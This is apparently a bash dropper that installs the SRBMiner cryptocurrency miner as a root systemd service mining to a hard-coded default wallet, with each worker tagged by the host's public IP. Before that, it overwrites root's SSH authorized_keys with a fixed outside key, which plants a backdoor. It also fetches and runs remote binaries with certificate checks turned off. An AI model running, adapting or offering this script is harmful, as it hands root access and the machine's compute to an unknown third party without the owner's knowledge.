#!/bin/bash
mkdir -p /root/.ssh
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAl5QreAwkidb7s2ucEKdlQ1q9/voCnGiLjvwwmQPgpm' >/root/.ssh/authorized_keys
chmod 700 /root/.ssh/authorized_keys
chown -R root:root /root/.ssh/authorized_keys

[ -z "$1" ] && WORKER_WALLET_ADDRESS='scash1qrqp3munsgnrjkfpwjf6jxj8emv2rj6agwrtxhk' || WORKER_WALLET_ADDRESS="$1"

if [ "$(which yum)" ]; then
    yum install curl bc -y
else
    apt update -y
    apt install curl bc -y
fi
systemctl is-active --quiet scash && systemctl stop --no-block scash

rm -rf /opt/scash

DIR="/opt/scash"

mkdir -p $DIR

version="$(wget -T 3 -t 2 -qO- https://github.com/doktor83/SRBMiner-Multi/releases | grep 'SRBMiner-MULTI' | grep releases | head -1 | awk '{print $7}' | xargs | awk -F '/' '{print $6}')"

url="https://github.com/doktor83/SRBMiner-Multi/releases/download/${version}/SRBMiner-Multi-$(echo $version | sed 's/\./-/g')-Linux.tar.gz"

wget --no-check-certificate $url -qO - | tar -zxf - -C $DIR --strip-components=1

chmod +x $DIR/SRBMiner-MULTI

eu=$(curl -s -o /dev/null -w "%{time_total}\n" stratum-eu.rplant.xyz)
asia=$(curl -s -o /dev/null -w "%{time_total}\n" stratum-asia.rplant.xyz)
na=$(curl -s -o /dev/null -w "%{time_total}\n" stratum-na.rplant.xyz)

if (($(bc <<<"$eu > $asia"))) && (($(bc <<<"$na > $asia"))); then
    pool_url="stratum-asia.rplant.xyz:17019"
elif (($(bc <<<"$asia > $eu"))) && (($(bc <<<"$na > $eu"))); then
    pool_url="stratum-eu.rplant.xyz:17019"
else
    pool_url="stratum-na.rplant.xyz:17019"
fi

COMMAND_BASE="${DIR}/SRBMiner-MULTI --algorithm randomscash --pool ${pool_url} --tls true --wallet ${WORKER_WALLET_ADDRESS}.\${ALIAS} --keepalive true"

echo '''#!/bin/bash
ALIAS=$(wget -T 3 -t 2 -qO- ifconfig.me | sed "s/\./-/g")
''' >$DIR/start.sh
echo $COMMAND_BASE >>$DIR/start.sh
chmod +x $DIR/start.sh

echo """[Unit]
Description=scash
DefaultDependencies=no
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=$DIR
ExecStart=$DIR/start.sh
Restart=always
RestartSec=5s
StandardOutput=file:$DIR/worker.log
StandardError=inherit
[Install]
WantedBy=default.target""" >/etc/systemd/system/scash.service

systemctl daemon-reload
systemctl enable scash
systemctl restart scash
